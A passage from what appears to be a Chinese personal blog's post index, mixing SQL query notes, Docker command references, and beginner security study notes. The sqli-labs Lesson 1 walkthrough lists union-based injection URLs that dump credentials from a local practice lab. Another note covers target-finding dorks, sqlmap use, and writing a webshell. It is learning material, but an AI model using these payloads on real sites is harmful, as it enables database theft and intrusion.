eg2.SELECT *(代表全部列名) FROM A PS. 1.GETDATE()——函数得到系统时间 2.YEAR()——返回指定日期的年日期部分的整数 eg3.SELECT A，YEAR(GETCHAR())-AGE FROM B 注：这里的YEAR(GETCHAR())-AGE中-是减号 3.DISTLNCT筛选避免重复 eg4.SELECT DISTINCT A FROM B 3.WHERE子句中的condition(1)使用比较运算符 =,&gt;,&lt;,&gt;=,&lt;=,!=或&lt;&gt;,!&gt;,!&lt; ps.逻辑运算符NOT+含上述比较运算符表达式 eg1.SELECT A FROM B WHERE NOT C&gt;20; (2)(NOT) BETWEEN…AND… ps. 1.BETWEEN后：范围的下限（及低值）；AND后范围的上限 eg1.SELECT A FROM WHERE A BETWEEN 1 AND 2; (3)确定集合 (NOT) IN &lt;表值，表值，表值…&gt; eg2.SELECT A FROM B WHERE C IN(&#39;a&#39;，&#39;b&#39;) (4)使用字符串匹配（NOT）LIKE 格式： [NOT] LIKE ‘&lt;匹配串&gt;’ [ESCAPE’&lt;转码字符&gt;’] 匹配模板：固定字符串或含通配符的字符串（当匹配模板为固定字符时，可以用=运算符取代LIKE,用!=或&lt;&gt;取代NOT LIKE 谓语） (5)通配符：%——代表任意长度（长度可以为0）的字符串 eg3.a%b表示以a开头，以b结尾的任意长度的字符串。acb、addgb等都符合该匹配串。 (6)_——代表任意单个字符 eg4.a_b表示以a开头，以b结尾的长度为3的任意字符串。如acb等都满足该匹配串。 eg5.查询第2个汉字为“阳”字的学生的姓名 SELECT name FROM Student WHERE name LIKE&#39;_阳%&#39; (7)ESCAPE短语 用户查询字符串本身带有%或_时要用ESCAPE’&lt;转码字符&gt;’短语对通配符进行转义 eg1. 错误表达：SELECT A FROM B WHERE C LIKE&#39;DB_DESIGN&#39; 注：C包含于A中 正确表达：SELECT A FROM B WHERE C LIKE&#39;DB\\_DESIGN&#39; ESCAPE&#39;\\&#39; eg2.SELECT * FROM A WHERE LIKE &#39;DB\\_%I__&#39; ESCAPE&#39;\\&#39; (8)涉及空值的查询 使用谓语IS NULL 或 IS NOT NULL “IS NULL”不能用“=NULL”代替 eg1.SELECT A FROM B WHERE A(C) IS NULL (10)多重条件查询：用逻辑运算符AND和OR来连接多个查询条件（注：1.AND的优先级高于OR ; 2.可以用括号改变优先级 ; 3.可以用来实现多种其他谓语） eg1.SELECT A FROM B WHERE C=&#39;a&#39; AND D&lt;20; eg2.SELECT A FROM B WHERE C IN(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) 4.对查询结果排序：使用ORDER BY 子句 可以按一个或多个属性列排序 a.ASC(升序)：排序列为空值的元组最后显示 b.DESC(降序)：排序列为空值的元组最先显示 eg1.SELECT A FROM B WHERE C=3 ORDER BY D DESC 5.使用集函数·5类主要集函数（1）COUNT(&lt;列名&gt;)：统计个数 （2）SUM(&lt;列名&gt;)：求总和 （3）ATG(&lt;列名&gt;)：求平均值 （4）MAX(&lt;列名&gt;)：求最大值 （5）MIN(&lt;列名&gt;)：求最小值 eg1.SELECT AVG(A) FROM B WHERE C=1; ps 1.统计时不计NULL值 2.COUNT(*)统计行数 3.DISTINCT 在列名前加DISTINCT则统计时去掉重复行 6.对查询结果分组###a.使用GEOUP BY子句分组 eg1.SELECT A FROM B WHERE C&gt;=90 GROUP BY A; ps 1.分组方法按指定的一列或多列值分组，值相等的为一组 2.使用GROUP BY 子句后，SELECT子句只能包含GROUP BY 后列名和集函数 3.GROUP BY 子句作用对象是查询的中间结果表 ###b.使用HAVING短语筛选最终输出的结果（WHERE是对FROM后的对象筛选，而HAVING是对ORDER BY分组后的结果筛选） eg1.SELECT A FROM B GROUP BY A HAVING COUNT(*)&gt;=3 ps 1.只有满足HAVING短语指定条件的组才输出 2.HAVING短语与WHERE子句区别：作用对象不同 WHERE子句作用于基表或视图，从中选择满足条件的元组 HAVING短语作用于组，从中选择满足条件的组","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli_lab_lesson1","date":"2021-10-10T07:26:38.000Z","path":"2021/10/10/sqli-lab-lesson1/","text":"sqli-lab-lesson1问题解析（萌新版）博主作为一位刚接触计算机萌新，有很多不懂的东西需要学习。以下是博主在按照别人的攻略通过sqli-libs-lesson1的遇到问题以及查找到的解答。 1.具体步骤（攻略链接：https://blog.csdn.net/weixin_51356351/article/details/109198820以下图片是博主根据攻略输入指令所得,部分内容有稍微进行修改） 判断注入点—-判断是数字型还是字符型—-查询列数—-查询显示位—-获取数据库名—-获取数据库中的表名—-获取列名—-获取列中的数据 其实不管是联合查询还是盲注之类的基本都这样，大同小异。 ①http://localhost/sqli-labs-master/Less-1/?id=1&#39;②http://localhost/sqli-labs-master/Less-1/?id=1&#39; – -③http://localhost/sqli-labs-master/Less-1/?id=1&#39; and 1=1– -④http://localhost/sqli-labs-master/Less-1/?id=1&#39; and 1=2– -⑤http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 3– -⑥http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 4– -⑦http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3– -⑧http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,database(),user()– -http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=“security”),3– -⑨http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=“security” and table_name=“users”),3 – -⑩http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1,(select group_concat(concat_ws(id,username,password)) from users),3– - 2.问题以及分析 a.?id=1’目的：根据报错判断数据库类型是MySQL；错误点在于id=1 和 LIMIT0,1’之间多了一个’,所以要将LIMIT之前的单引号闭合。 例如?id=1’and’1’=’1 b.源码：$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;分析：Id参数在拼接sql语句时，未对id进行任何的过滤等操作 ，导致了注入漏洞。为了执行查询语句select，需要注释掉末尾的单引号 http://localhost/sqli-labs-master/Less-1/?id=1&#39; – -:单引号依然没有闭合，因为 – 直接连接了LTMIT，所以应当在 – 后加空格，一般浏览器传数据的时候不会将输入的空格传到服务器，所以要使用 +或编码值%20，即–+或–%20。这里使用– -也起到了同样的效果。 c.order by 语句用于查询数据库有几列。 d.union操作符用于合并两个或多个SELECT语句的结果集。 e.user()用户名 f.database()数据库名 g.concat_ws ()含有分隔符地连接字符串 h.select语句建议去阅读这篇文章。https://blog.51cto.com/jimshu/1363101#:~:text=SELECT%E8%AF%AD%E5%8F%A5%E6%98%AF%20T-SQL%20%E4%B8%AD%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E3%80%82%20SELECT%20%E8%AF%AD%E5%8F%A5%E5%8F%AF%E8%83%BD%E8%BF%94%E5%9B%9E%E4%B8%80%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%88record%EF%BC%89%EF%BC%8C%E4%B9%9F%E5%8F%AF%E8%83%BD%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%88result%20set%EF%BC%89%E3%80%82%20SELECT%E8%AF%AD%E5%8F%A5%E5%8F%AF%E4%BB%A5%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E5%AD%90%E5%8F%A5%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%9E%84%E6%88%90%E5%A4%8D%E6%9D%82%E7%9A%84%E6%9F%A5%E8%AF%A2%E3%80%82%20%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AD%90%E5%8F%A5%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%EF%BC%9A,%E5%AD%90%E5%8F%A5%EF%BC%8C%E5%AF%B9%E8%BE%93%E5%87%BA%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F%E3%80%82%201.%20%E8%AF%AD%E6%B3%95%E8%A7%A3%E9%87%8A%20SELECT%20%E5%AD%90%E5%8F%A5%E4%B8%8E%E5%85%B6%E5%AE%83%E5%AD%90%E5%8F%A5%EF%BC%88%E8%87%B3%E5%B0%91%E5%8C%85%E5%90%AB%20FROM%20%E5%AD%90%E5%8F%A5%EF%BC%89%E7%BB%84%E6%88%90%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%AF%A2%EF%BC%8CSELECT%20%E5%AD%90%E5%8F%A5%E7%94%A8%E4%BA%8E%E7%AD%9B%E9%80%89%E9%9C%80%E8%A6%81%E8%BE%93%E5%87%BA%E7%9A%84%E5%88%97%E6%88%96%E8%80%85%E8%A1%A8%E8%BE%BE%E5%BC%8F%E3%80%82","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入一般流程（学习笔记）","date":"2021-10-07T14:58:23.000Z","path":"2021/10/07/sqli注入流程笔记/","text":"sql注入一般流程（1）目标收集a.无特定目标inurl:.php?id=//注意php前有一个小点 b.有特定目标inurl:.php?id=sit:target.com c.工具爬取spider，对收索引擎和目标网站的链接经行爬取 （2）注入识别a.手工简单识别:’ :and 1=1/and1=2 :and ‘1’=’1/and’1’=’2 :and 1 like 1/and 1 like 2 b.工具识别sqlmap -m filename(filename中保存检测目标) sqlmap -crawl(sqlmap对目标网站经行爬取然后依次进行测试) ps.高级识别 扩展识别的广度和深度 sqlmap–level 增加测试级别，对header中相关参进行测试 sqlmap -r filename (filename 中为网站请求数据) 利用工具提高识别效率 Burp Suite + SqlMap BurpSuite 拦截所有浏览器访问提交的数据 BurpSuite扩展插件，直接调用SqlMap测试 ps.建议1.可以在参数后输入’*’来确定想测试的参数 eg：参照暴力破解 2.可能出现注入的点：新闻、登入、搜索、留言……(常见疏忽防守的地方) 3.要站在开发者的角度去寻找 c.代码审计搜索关键代码和函数 梳理业务流程 （3）SQL注入①信息搜集 1&gt;.数据库类型： a.check the manual that corresponds to your MySQL server version for the right syntax(mysql类型) b.Microsoft JET Datebase Engine 错误 ‘80040e14’(website类型) c.也可用函数version()、@@version进行查询 2&gt;.数据库版本：a.@@version v$version 3&gt;.数据库用户：user() SYSTEM_VSER 4&gt;.数据库权限：super_priv IS_SRVROLEMEMBER ②获得数据 a.获取库信息 b.获取表信息 c.获取列信息 d.获取数据 （1.通过语句查询2.通过暴力破解） ps.暴力破解 wed.mdb select[*] from xxx select[xxx] from XXXXX ③提权 a.执行命令：SQLSever 权限 b.读文件：读中间件配置文件;读数据库配置文件 c.写webshell到网站目录","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-rootfs命令及镜像仓库","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器rootfs命令与镜像仓库/","text":"容器rootfs命令本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker commit :从容器创建一个新的镜像。 语法docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]OPTIONS说明： -a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。 实例将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。 runoob@runoob:~$ docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2 mymysql:v1 sha256:37af1236adef1544e8886be23010b66577647a40bc02c0885a6600b33ee28057 runoob@runoob:~$ docker images mymysql:v1 REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 15 seconds ago 329 MB （2）docker cp :用于容器与主机之间的数据拷贝。 语法docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH OPTIONS说明： -L :保持源目标中的链接 实例将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。 docker cp /www/runoob 96f7f14e99ab:/www/ 将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。 docker cp /www/runoob 96f7f14e99ab:/www 将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。 docker cp 96f7f14e99ab:/www /tmp/ （3）docker diff : 检查容器里文件结构的更改。 语法 docker diff [OPTIONS] CONTAINER 实例查看容器mymysql的文件结构更改。 runoob@runoob:~$ docker diff mymysql A /logs A /mysql_data C /run C /run/mysqld A /run/mysqld/mysqld.pid A /run/mysqld/mysqld.sock C /tmp 镜像仓库（1）docker login : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub docker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub 语法docker login [OPTIONS] [SERVER] docker logout [OPTIONS] [SERVER] OPTIONS说明： -u :登陆的用户名 -p :登陆的密码 实例登陆到Docker Hub docker login -u 用户名 -p 密码 登出Docker Hub docker logout （2）docker pull : 从镜像仓库中拉取或者更新指定镜像 语法docker pull [OPTIONS] NAME[:TAG|@DIGEST] OPTIONS说明： -a :拉取所有 tagged 镜像 –disable-content-trust :忽略镜像的校验,默认开启 实例从Docker Hub下载java最新版镜像。 docker pull java 从Docker Hub下载REPOSITORY为java的所有镜像。 docker pull -a java （3）docker push : 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库 语法docker push [OPTIONS] NAME[:TAG] OPTIONS说明： –disable-content-trust :忽略镜像的校验,默认开启 实例上传本地镜像myapache:v1到镜像仓库中。 docker push myapache:v1 （4）docker search : 从Docker Hub查找镜像 语法docker search [OPTIONS] TERM OPTIONS说明： –automated :只列出 automated build类型的镜像； –no-trunc :显示完整的镜像描述； -f &lt;过滤条件&gt;:列出收藏数不小于指定值的镜像。 实例从 Docker Hub 查找所有镜像名包含 java，并且收藏数大于 10 的镜像 runoob@runoob:~$ docker search -f stars=10 java NAME DESCRIPTION STARS OFFICIAL AUTOMATED java Java is a concurrent, class-based... 1037 [OK] anapsix/alpine-java Oracle Java 8 (and 7) with GLIBC ... 115 [OK] develar/java 46 [OK] isuper/java-oracle This repository contains all java... 38 [OK] lwieske/java-8 Oracle Java 8 Container - Full + ... 27 [OK] nimmis/java-centos This is docker images of CentOS 7... 13 [OK] 参数说明： NAME: 镜像仓库源的名称 DESCRIPTION: 镜像的描述 OFFICIAL: 是否 docker 官方发布 stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。 AUTOMATED: 自动构建。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-容器操作","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器操作/","text":"docker的常用命令-容器操作本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker ps : 列出容器 语法docker ps [OPTIONS]OPTIONS说明： -a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 –format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 –no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。 实例 列出所有在运行的容器信息。 runoob@runoob:~$ docker ps CONTAINER ID IMAGE COMMAND … PORTS NAMES 09b93464c2f7 nginx:latest “nginx -g ‘daemon off” … 80/tcp, 443/tcp myrunoob 96f7f14e99ab mysql:5.6 “docker-entrypoint.sh” … 0.0.0.0:3306-&gt;3306/tcp mymysql 输出详情介绍： CONTAINER ID: 容器 ID。 IMAGE: 使用的镜像。 COMMAND: 启动容器时运行的命令。 CREATED: 容器的创建时间。 STATUS: 容器状态。 状态有7种： created（已创建） restarting（重启中） running（运行中） removing（迁移中） paused（暂停） exited（停止） dead（死亡） PORTS: 容器的端口信息和使用的连接类型（tcp\\udp）。 NAMES: 自动分配的容器名称。 列出最近创建的5个容器信息。 runoob@runoob:~$ docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED 09b93464c2f7 nginx:latest &quot;nginx -g &#39;daemon off&quot; 2 days ago ... b8573233d675 nginx:latest &quot;/bin/bash&quot; 2 days ago ... b1a0703e41e7 nginx:latest &quot;nginx -g &#39;daemon off&quot; 2 days ago ... f46fb1dec520 5c6e1090e771 &quot;/bin/sh -c &#39;set -x \\t&quot; 2 days ago ... a63b4a5597de 860c279d2fec &quot;bash&quot; 2 days ago ... 列出所有创建的容器ID。 runoob@runoob:~$ docker ps -a -q09b93464c2f7 b8573233d675 b1a0703e41e7 f46fb1dec520 a63b4a5597de 6a4aa42e947b de7bb36e7968 43a432b73776 664a8ab1a585 ba52eb632bbd … (2)docker inspect : 获取容器/镜像的元数据。 语法docker inspect [OPTIONS] NAME|ID [NAME|ID…]OPTIONS说明： -f :指定返回值的模板文件。 -s :显示总的文件大小。 –type :为指定类型返回JSON。 实例获取镜像mysql:5.6的元信息。 获取正在运行的容器mymysql的 IP。 ``runoob@runoob:~$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mymysql 172.17.0.3``` (3)docker top :查看容器中运行的进程信息，支持 ps 命令参数。 语法docker top [OPTIONS] CONTAINER [ps OPTIONS] 容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。 实例查看容器mymysql的进程信息。 runoob@runoob:~/mysql$ docker top mymysql UID PID PPID C STIME TTY TIME CMD 999 40347 40331 18 00:58 ? 00:00:02 mysqld 查看所有运行容器的进程信息。 for i in docker ps |grep Up|awk &#39;&#123;print $1&#125;&#39;;do echo \\ &amp;&amp;docker top $i; done (3)docker attach :连接到正在运行中的容器。 语法docker attach [OPTIONS] CONTAINER要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。 官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上–sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。 实例容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。 runoob@runoob:~$ docker attach --sig-proxy=false mynginx 192.168.239.1 - - [10/Jul/2016:16:54:26 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; (4)docker events : 从服务器获取实时事件 语法docker events [OPTIONS]OPTIONS说明： -f ：根据条件过滤事件； –since ：从指定的时间戳后显示所有事件; –until ：流水时间显示到指定的时间为止； 实例显示docker 2016年7月1日后的所有事件。 runoob@runoob:~/mysql$ docker events --since=&quot;1467302400&quot; 2016-07-08T19:44:54.501277677+08:00 network connect 66f958fd13dc4314ad20034e576d5c5eba72e0849dcc38ad9e8436314a4149d4 (container=b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64, name=bridge, type=bridge) 2016-07-08T19:44:54.723876221+08:00 container start b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (image=nginx:latest, name=elegant_albattani) 2016-07-08T19:44:54.726110498+08:00 container resize b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (height=39, image=nginx:latest, name=elegant_albattani, width=167) 2016-07-08T19:46:22.137250899+08:00 container die b8573233d675705df8c89796a2c2687cd8e36e03646457a15fb51022db440e64 (exitCode=0, image=nginx:latest, name=elegant_albattani) ... 显示docker 镜像为mysql:5.6 2016年7月1日后的相关事件。 runoob@runoob:~/mysql$ docker events -f &quot;image&quot;=&quot;mysql:5.6&quot; --since=&quot;1467302400&quot; 2016-07-11T00:38:53.975174837+08:00 container start 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql) 2016-07-11T00:51:17.022572452+08:00 container kill 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql, signal=9) 2016-07-11T00:51:17.132532080+08:00 container die 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (exitCode=137, image=mysql:5.6, name=mymysql) 2016-07-11T00:51:17.514661357+08:00 container destroy 96f7f14e99ab9d2f60943a50be23035eda1623782cc5f930411bbea407a2bb10 (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.551984549+08:00 container create c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.557405864+08:00 container attach c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:18.844134112+08:00 container start c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:57:19.140141428+08:00 container die c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (exitCode=1, image=mysql:5.6, name=mymysql) 2016-07-11T00:58:05.941019136+08:00 container destroy c8f0a32f12f5ec061d286af0b1285601a3e33a90a08ff1706de619ac823c345c (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:07.965128417+08:00 container create a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:08.188734598+08:00 container start a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T00:58:20.010876777+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 2016-07-11T01:06:01.395365098+08:00 container top a404c6c174a21c52f199cfce476e041074ab020453c7df2a13a7869b48f2f37e (image=mysql:5.6, name=mymysql) 如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如–since=”2016-07-01”。 (5)docker logs : 获取容器的日志 语法docker logs [OPTIONS] CONTAINEROPTIONS说明： -f : 跟踪日志输出 –since :显示某个开始时间的所有日志 -t : 显示时间戳 –tail :仅列出最新N条容器日志 实例跟踪查看容器mynginx的日志输出。 runoob@runoob:~$ docker logs -f mynginx 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; 2016/07/10 16:53:33 [error] 5#5: *1 open() &quot;/usr/share/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.239.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.239.130&quot;, referrer: &quot;http://192.168.239.130/&quot; 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.239.130/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; 192.168.239.1 - - [10/Jul/2016:16:53:59 +0000] &quot;GET / HTTP/1.1&quot; 304 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36&quot; &quot;-&quot; …查看容器mynginx从2016年7月1日后的最新10条日志。 docker logs –since=”2016-07-01” –tail=10 mynginx (6)docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码。 语法 docker wait [OPTIONS] CONTAINER [CONTAINER…] 实例docker wait CONTAINER (7)docker export :将文件系统作为一个tar归档文件导出到STDOUT。 语法docker export [OPTIONS] CONTAINER OPTIONS说明： -o :将输入内容写到文件。 实例将id为a404c6c174a2的容器按日期保存为tar文件。 runoob@runoob:~$ docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2 runoob@runoob:~$ ls mysql-`date +%Y%m%d`.tar mysql-20160711.tar (8)docker port :列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。 语法 docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]] 实例查看容器mynginx的端口映射情况。 runoob@runoob:~$ docker port mymysql3306/tcp -&gt; 0.0.0.0:3306","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-容器生命周期管理","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-容器生命周期管理/","text":"docker命令大全-容器生命周期管理本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 （1）docker start :启动一个或多个已经被停止的容器 docker stop :停止一个运行中的容器 docker restart :重启容器 语法docker start [OPTIONS] CONTAINER [CONTAINER…] docker stop [OPTIONS] CONTAINER [CONTAINER…] docker restart [OPTIONS] CONTAINER [CONTAINER…] 实例 启动已被停止的容器myrunoob docker start myrunoob停止运行中的容器myrunoob docker stop myrunoob重启容器myrunoob docker restart myrunoob （2）docker run ：创建一个新的容器并运行一个命令 语法docker run [OPTIONS] IMAGE [COMMAND] [ARG…] OPTIONS说明： -a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -P: 随机端口映射，容器内部端口随机映射到主机的端口 -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； –name=”nginx-lb”: 为容器指定一个名称； –dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； –dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h “mars”: 指定容器的hostname； -e username=”ritchie”: 设置环境变量； –env-file=[]: 从指定文件读入环境变量； –cpuset=”0-2” or –cpuset=”0,1,2”: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； –net=”bridge”: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； –link=[]: 添加链接到另一个容器； –expose=[]: 开放一个端口或一组端口； –volume , -v: 绑定一个卷 实例 使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。 docker run –name mynginx -d nginx:latest 使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。 docker run -P -d nginx:latest 使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。 docker run -p 80:80 -v /data:/data -d nginx:latest 绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。 $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash 使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。 runoob@runoob:~$ docker run -it nginx:latest /bin/bashroot@b8573233d675:/# （3）docker kill :杀掉一个运行中的容器。 语法docker kill [OPTIONS] CONTAINER [CONTAINER…]OPTIONS说明： -s :向容器发送一个信号 实例杀掉运行中的容器mynginx runoob@runoob:~$ docker kill -s KILL mynginxmynginx （4）docker rm ：删除一个或多个容器。 语法docker rm [OPTIONS] CONTAINER [CONTAINER…]OPTIONS说明： -f :通过 SIGKILL 信号强制删除一个运行中的容器。 -l :移除容器间的网络连接，而非容器本身。 -v :删除与容器关联的卷。 实例强制删除容器 db01、db02： docker rm -f db01 db02 移除容器 nginx01 对容器 db01 的连接，连接名 db： docker rm -l db 删除容器 nginx01, 并删除容器挂载的数据卷： docker rm -v nginx01 删除所有已经停止的容器： docker rm $(docker ps -a -q） （5）docker pause :暂停容器中所有的进程。 docker unpause :恢复容器中所有的进程。 语法docker pause CONTAINER [CONTAINER…] docker unpause CONTAINER [CONTAINER…]实例暂停数据库容器db01提供服务。 docker pause db01 恢复数据库容器 db01 提供服务。 docker unpause db01 （6）docker create ：创建一个新的容器但不启动它 用法同 docker run 语法docker create [OPTIONS] IMAGE [COMMAND] [ARG…] 语法同 docker run 实例使用docker镜像nginx:latest创建一个容器,并将容器命名为myrunoob runoob@runoob:~$ docker create –name myrunoob nginx:latest09b93464c2f75b7b69f83d56a9cfc23ceb50a48a9db7652ee4c27e3e2cb1961f (7)docker exec ：在运行的容器中执行命令 语法docker exec [OPTIONS] CONTAINER COMMAND [ARG…]OPTIONS说明： -d :分离模式: 在后台运行 -i :即使没有附加也保持STDIN 打开 -t :分配一个伪终端 实例在容器 mynginx 中以交互模式执行容器内 /root/runoob.sh 脚本: runoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.shhttp://www.runoob.com/在容器 mynginx 中开启一个交互模式的终端: runoob@runoob:~$ docker exec -i -t mynginx /bin/bash root@b1a0703e41e7:/#也可以通过 docker ps -a 命令查看已经在运行的容器，然后使用容器 ID 进入容器。 查看已经在运行的容器 ID： docker ps -a…9df70f9a0714 openjdk “/usercode/script.sh…”…第一列的 9df70f9a0714 就是容器 ID。 通过 exec 命令对指定的容器执行 bash: docker exec -it 9df70f9a0714 /bin/bash","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"docker命令大全-本地镜像管理及Docker info 